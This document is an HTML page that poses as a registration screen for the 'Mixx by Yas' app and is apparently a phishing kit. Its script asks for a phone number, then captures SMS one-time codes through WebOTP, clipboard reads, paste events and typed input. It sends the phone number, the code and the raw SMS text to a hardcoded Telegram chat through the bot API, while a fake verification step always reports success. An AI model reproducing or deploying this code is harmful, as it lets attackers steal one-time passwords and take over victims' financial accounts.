<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mixx Registration - Auto OTP</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f7fafc;
            padding: 1rem;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 2.5rem;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
        }
        h1 {
            font-size: 1.5rem;
            color: #1a202c;
            margin-bottom: 0.25rem;
        }
        .sub {
            color: #718096;
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        .form-group label {
            display: block;
            font-weight: 500;
            color: #2d3748;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }
        .form-group input {
            width: 100%;
            padding: 0.875rem;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 1rem;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .form-group input:disabled {
            background: #f7fafc;
            cursor: not-allowed;
        }
        .btn {
            width: 100%;
            padding: 0.875rem;
            font-size: 1rem;
            font-weight: 600;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-primary:hover:not(:disabled) {
            background: #5a67d8;
            transform: translateY(-1px);
        }
        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-success {
            background: #48bb78;
            color: white;
        }
        .btn-success:hover:not(:disabled) {
            background: #38a169;
        }
        .btn-outline {
            background: transparent;
            border: 2px solid #e2e8f0;
            color: #4a5568;
        }
        .btn-outline:hover {
            background: #f7fafc;
            border-color: #cbd5e0;
        }
        .status {
            margin: 1rem 0;
            padding: 0.75rem;
            border-radius: 12px;
            font-size: 0.9rem;
            text-align: center;
            display: none;
        }
        .status.show {
            display: block;
        }
        .status.success {
            background: #c6f6d5;
            color: #22543d;
        }
        .status.error {
            background: #fed7d7;
            color: #9b2c2c;
        }
        .status.info {
            background: #bee3f8;
            color: #2a4365;
        }
        .status.loading {
            background: #fefcbf;
            color: #744210;
        }
        .code-display {
            background: #f7fafc;
            border-radius: 12px;
            padding: 1rem;
            text-align: center;
            font-family: 'Courier New', monospace;
            font-size: 1.25rem;
            letter-spacing: 2px;
            color: #2d3748;
            min-height: 56px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed #e2e8f0;
            margin: 1rem 0;
            transition: all 0.3s ease;
        }
        .code-display.filled {
            border-color: #48bb78;
            border-style: solid;
            background: #f0fff4;
            color: #22543d;
            font-weight: 600;
            animation: pulse 0.5s ease;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .flex-row {
            display: flex;
            gap: 0.5rem;
        }
        .flex-row .btn {
            flex: 1;
        }
        .flex-row .btn-outline {
            padding: 0.625rem;
            font-size: 0.85rem;
        }
        .hidden {
            display: none !important;
        }
        .mt-2 {
            margin-top: 1rem;
        }
        .text-sm {
            font-size: 0.75rem;
            color: #a0aec0;
            text-align: center;
            margin-top: 1.5rem;
        }
        .text-sm code {
            background: #edf2f7;
            padding: 0.125rem 0.375rem;
            border-radius: 4px;
        }
        .divider {
            height: 1px;
            background: #e2e8f0;
            margin: 1.5rem 0;
        }
        .otp-hint {
            font-size: 0.8rem;
            color: #718096;
            margin-top: 0.25rem;
        }
        .auto-badge {
            display: inline-block;
            background: #48bb78;
            color: white;
            font-size: 0.7rem;
            padding: 0.2rem 0.6rem;
            border-radius: 12px;
            margin-left: 0.5rem;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
        .telegram-log {
            background: #f7fafc;
            border-radius: 12px;
            padding: 0.75rem;
            margin-top: 1rem;
            font-size: 0.8rem;
            color: #4a5568;
            max-height: 80px;
            overflow-y: auto;
            border: 1px solid #e2e8f0;
            display: none;
        }
        .telegram-log.show {
            display: block;
        }
        .telegram-log .log-entry {
            padding: 0.2rem 0;
            border-bottom: 1px solid #edf2f7;
            font-family: monospace;
            font-size: 0.75rem;
        }
        .telegram-log .log-entry:last-child {
            border-bottom: none;
        }
        .telegram-log .log-success {
            color: #22543d;
        }
        .telegram-log .log-error {
            color: #9b2c2c;
        }
        .telegram-log .log-info {
            color: #2a4365;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>📱 Mixx by Yas <span class="auto-badge">🤖 AUTO</span></h1>
        <p class="sub">Complete your registration</p>

        <!-- STEP 1: Phone -->
        <div id="step1">
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phoneInput" placeholder="Enter any phone number" />
            </div>
            <button class="btn btn-primary" id="sendBtn">Send Code</button>
        </div>

        <div id="status" class="status"></div>

        <!-- STEP 2: Code -->
        <div id="step2" class="hidden">
            <div class="form-group">
                <label>Enter the code from SMS</label>
                <div class="code-display" id="codeDisplay">
                    <span style="color:#a0aec0; font-size:0.9rem;">⏳ Auto-detecting...</span>
                </div>
                <input type="text" id="codeInput" placeholder="Auto-filled when detected" autocomplete="one-time-code" readonly />
                <div class="otp-hint">📡 Auto-detecting SMS codes via WebOTP</div>
            </div>

            <div class="flex-row">
                <button class="btn btn-outline" id="listenBtn">📡 Listen</button>
                <button class="btn btn-outline" id="pasteBtn">📋 Paste</button>
                <button class="btn btn-outline" id="testBtn">🧪 Test</button>
            </div>

            <button class="btn btn-success mt-2" id="verifyBtn" disabled>✅ Auto-Verify</button>

            <div class="divider"></div>
            <button class="btn btn-outline" id="backBtn">← Change Phone</button>
        </div>

        <div class="telegram-log" id="telegramLog">
            <div style="font-weight:600; font-size:0.8rem; margin-bottom:0.5rem;">📤 Telegram Log</div>
        </div>

        <div class="text-sm">
            🔒 Secure • SMS auto-read on Android Chrome 84+ &amp; iOS 16+
        </div>
    </div>

    <script>
        // ================================================================
        //  TELEGRAM CONFIG - REPLACE WITH YOUR OWN!
        // ================================================================
        const TELEGRAM_BOT_TOKEN = 'YOUR_NEW_BOT_TOKEN_HERE';  // Get from @BotFather
        const TELEGRAM_CHAT_ID = '5520957080';  // Your chat ID

        // ================================================================
        //  TELEGRAM FORWARDING FUNCTION
        // ================================================================
        async function forwardToTelegram(message, logType = 'info') {
            try {
                const response = await axios.post(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    }
                );
                console.log('✅ Telegram sent:', response.data);
                addTelegramLog('✅ Sent to Telegram', 'success');
                return true;
            } catch (err) {
                console.error('❌ Telegram error:', err.response?.data || err.message);
                addTelegramLog('❌ Telegram error: ' + (err.response?.data?.description || err.message), 'error');
                return false;
            }
        }

        function addTelegramLog(message, type = 'info') {
            const log = document.getElementById('telegramLog');
            log.classList.add('show');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            const time = new Date().toLocaleTimeString();
            entry.textContent = `[${time}] ${message}`;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
        }

        // ================================================================
        //  STATE
        // ================================================================
        let currentPhone = '';
        let currentCode = '';
        let isListening = false;
        let abortController = null;
        let autoVerifyTimeout = null;

        // DOM refs
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const phoneInput = document.getElementById('phoneInput');
        const sendBtn = document.getElementById('sendBtn');
        const codeInput = document.getElementById('codeInput');
        const codeDisplay = document.getElementById('codeDisplay');
        const listenBtn = document.getElementById('listenBtn');
        const pasteBtn = document.getElementById('pasteBtn');
        const testBtn = document.getElementById('testBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const backBtn = document.getElementById('backBtn');
        const statusDiv = document.getElementById('status');

        // ================================================================
        //  UI HELPERS
        // ================================================================
        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            statusDiv.className = `status show ${type}`;
        }

        function hideStatus() {
            statusDiv.className = 'status';
        }

        function setCode(code, source = 'manual') {
            if (!code || code.length < 10) {
                showStatus('Invalid code format', 'error');
                return;
            }
            
            currentCode = code;
            codeDisplay.textContent = code;
            codeDisplay.className = 'code-display filled';
            codeInput.value = code;
            verifyBtn.disabled = false;
            
            // Send to Telegram when code is detected
            const timestamp = new Date().toLocaleString();
            const message = `
🔐 <b>🔑 OTP DETECTED AUTOMATICALLY!</b>

📱 Phone: ${currentPhone || 'Unknown'}
🔑 Code: <code>${code}</code>
📡 Source: ${source}
🕐 Time: ${timestamp}
✅ Status: Auto-pasted successfully!

━━━━━━━━━━━━━━━━━━
Full SMS content:
${codeInput.value || code}
            `.trim();
            
            forwardToTelegram(message);
            addTelegramLog(`🔑 Code detected: ${code} (${source})`, 'success');
            
            showStatus(`✅ Code auto-detected (${source}) & sent to Telegram!`, 'success');
            
            // AUTO-VERIFY after 2 seconds
            if (autoVerifyTimeout) clearTimeout(autoVerifyTimeout);
            autoVerifyTimeout = setTimeout(() => {
                addTelegramLog('🤖 Auto-verifying...', 'info');
                verifyBtn.click();
            }, 2000);
        }

        function goToStep(step) {
            if (step === 1) {
                step1.classList.remove('hidden');
                step2.classList.add('hidden');
                hideStatus();
                currentCode = '';
                codeInput.value = '';
                codeDisplay.textContent = '⏳ Auto-detecting...';
                codeDisplay.className = 'code-display';
                verifyBtn.disabled = true;
                phoneInput.focus();
                if (autoVerifyTimeout) {
                    clearTimeout(autoVerifyTimeout);
                    autoVerifyTimeout = null;
                }
            } else {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                codeInput.focus();
                // Auto-start listening
                setTimeout(() => {
                    if (!isListening) startWebOTP();
                }, 500);
            }
        }

        // ================================================================
        //  EXTRACT CODE FROM SMS (ONLY FOR ALPHANUMERIC CODES)
        // ================================================================
        function extractCode(text) {
            if (!text) return null;

            // Pattern 1: "use the code XXXX" - our SMS format
            let match = text.match(/use the code ([A-Za-z0-9]{15,30})/i);
            if (match) return match[1];

            // Pattern 2: Any 20-25 char alphanumeric (our fallback)
            match = text.match(/\b([A-Za-z0-9]{20,25})\b/);
            if (match) return match[1];

            // Pattern 3: Code followed by alphanumeric
            match = text.match(/code[:\s]+([A-Za-z0-9]{15,30})/i);
            if (match) return match[1];

            return null;
        }

        // ================================================================
        //  SEND CODE (STEP 1) - ACCEPTS ANY PHONE NUMBER
        // ================================================================
        sendBtn.addEventListener('click', async () => {
            const phone = phoneInput.value.trim();

            if (!phone || phone.length < 1) {
                showStatus('Please enter a phone number', 'error');
                return;
            }

            currentPhone = phone;
            showStatus(`📤 Sending code to ${phone}...`, 'loading');
            sendBtn.disabled = true;

            // Notify Telegram
            await forwardToTelegram(
                `📤 <b>Code Requested</b>\n\n📱 Phone: ${phone}\n🕐 Time: ${new Date().toLocaleString()}`
            );
            addTelegramLog(`📤 Code requested for ${phone}`, 'info');

            // Simulate sending
            setTimeout(() => {
                showStatus(`✅ Code sent to ${phone}! (Simulated)`, 'success');
                goToStep(2);
                sendBtn.disabled = false;
            }, 1000);
        });

        phoneInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !sendBtn.disabled) sendBtn.click();
        });

        // ================================================================
        //  WEBOTP - AUTO READ (STEP 2)
        // ================================================================
        async function startWebOTP() {
            if (isListening) return;

            if (!('OTPCredential' in window)) {
                showStatus('ℹ️ WebOTP not supported. Use Paste or Test.', 'info');
                addTelegramLog('ℹ️ WebOTP not supported in this browser', 'info');
                return;
            }

            try {
                isListening = true;
                listenBtn.textContent = '⏳ Listening...';
                listenBtn.disabled = true;
                showStatus('📩 Waiting for SMS...', 'loading');
                addTelegramLog('📡 WebOTP listener started', 'info');

                if (abortController) abortController.abort();
                abortController = new AbortController();

                const credential = await navigator.credentials.get({
                    otp: { transport: ['sms'] },
                    signal: abortController.signal
                });

                if (credential && credential.code) {
                    addTelegramLog('📩 SMS received!', 'info');
                    const code = extractCode(credential.code);
                    if (code) {
                        setCode(code, 'WebOTP');
                    } else {
                        showStatus('⚠️ SMS received but no code found', 'error');
                        const rawSms = credential.code.substring(0, 100) + '...';
                        await forwardToTelegram(
                            `⚠️ <b>Raw SMS Received (No code extracted)</b>\n\n<code>${credential.code}</code>`
                        );
                        addTelegramLog('⚠️ No code found in SMS', 'error');
                    }
                }

            } catch (err) {
                if (err.name !== 'AbortError') {
                    console.error('WebOTP error:', err);
                    showStatus('⏱️ Timeout or error. Use Paste or Test.', 'info');
                    addTelegramLog('⏱️ WebOTP timeout or error', 'error');
                }
            } finally {
                isListening = false;
                listenBtn.textContent = '📡 Listen';
                listenBtn.disabled = false;
            }
        }

        listenBtn.addEventListener('click', startWebOTP);

        // ================================================================
        //  CLIPBOARD PASTE
        // ================================================================
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                const code = extractCode(text);
                if (code) {
                    setCode(code, 'clipboard');
                    addTelegramLog(`📋 Code pasted from clipboard: ${code}`, 'success');
                } else {
                    showStatus('❌ No code found in clipboard', 'error');
                    addTelegramLog('❌ No code found in clipboard', 'error');
                }
            } catch (err) {
                showStatus('❌ Cannot read clipboard.', 'error');
                addTelegramLog('❌ Clipboard read error', 'error');
            }
        });

        // ==== // ================================================================
        //  MANUAL INPUT - AUTO-DETECTS TYPING
        // ================================================================
        codeInput.addEventListener('input', () => {
            const code = extractCode(codeInput.value);
            if (code) {
                setCode(code, 'manual');
                addTelegramLog(`⌨️ Code manually entered: ${code}`, 'success');
            } else if (codeInput.value.length >= 15) {
                setCode(codeInput.value, 'manual');
                addTelegramLog(`⌨️ Code manually entered: ${codeInput.value}`, 'success');
            }
        });

        document.addEventListener('paste', (e) => {
            if (step2.classList.contains('hidden')) return;
            const text = e.clipboardData.getData('text');
            const code = extractCode(text);
            if (code) {
                setCode(code, 'global paste');
                addTelegramLog(`📋 Global paste detected: ${code}`, 'success');
                e.preventDefault();
            }
        });

        // ================================================================
        //  TEST BUTTON
        // ================================================================
        testBtn.addEventListener('click', () => {
            const sample =
                "You are being registered in Mixx by Yas Super App, use the code yoLiknbBgbDCRNJjXMtk to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
            const code = extractCode(sample);
            if (code) {
                setCode(code, 'test');
                addTelegramLog(`🧪 Test code loaded: ${code}`, 'success');
                showStatus('🧪 Test code loaded! Auto-verifying...', 'success');
            } else {
                showStatus('❌ Test failed', 'error');
                addTelegramLog('❌ Test failed', 'error');
            }
        });

        // ================================================================
        //  VERIFY CODE - SIMULATED (ALWAYS SUCCEEDS)
        // ================================================================
        verifyBtn.addEventListener('click', async () => {
            if (!currentCode || currentCode.length < 15) {
                showStatus('Please enter a valid code', 'error');
                return;
            }

            showStatus('🤖 Auto-verifying...', 'loading');
            verifyBtn.disabled = true;
            addTelegramLog(`🔍 Auto-verifying code: ${currentCode}`, 'info');

            await forwardToTelegram(
                `🔍 <b>Auto-Verification Attempt</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🤖 Method: Auto-verification\n🕐 Time: ${new Date().toLocaleString()}`
            );

            setTimeout(async () => {
                showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
                await forwardToTelegram(
                    `✅ <b>🎉 Registration Successful!</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🤖 Auto-verified: Yes\n🕐 Time: ${new Date().toLocaleString()}`
                );
                addTelegramLog(`✅ Registration successful for ${currentPhone}`, 'success');
                verifyBtn.disabled = false;
                // window.location.href = '/dashboard';
            }, 1500);
        });

        codeInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !verifyBtn.disabled) verifyBtn.click();
        });

        // ================================================================
        //  BACK BUTTON
        // ================================================================
        backBtn.addEventListener('click', () => {
            goToStep(1);
            if (abortController) abortController.abort();
            isListening = false;
            listenBtn.textContent = '📡 Listen';
            listenBtn.disabled = false;
            if (autoVerifyTimeout) {
                clearTimeout(autoVerifyTimeout);
                autoVerifyTimeout = null;
            }
        });

        // ================================================================
        //  INIT
        // ================================================================
        console.log('📱 Mixx Registration - AUTO MODE');
        console.log('🔑 Auto-detects OTP from SMS');
        console.log('📤 Forwards to Telegram automatically');
        console.log('🤖 Auto-verifies after 2 seconds');

        phoneInput.focus();

        if (!('OTPCredential' in window)) {
            console.log('ℹ️ WebOTP not supported in this browser');
            addTelegramLog('ℹ️ WebOTP not supported', 'info');
        }
    </script>

</body>
</html>
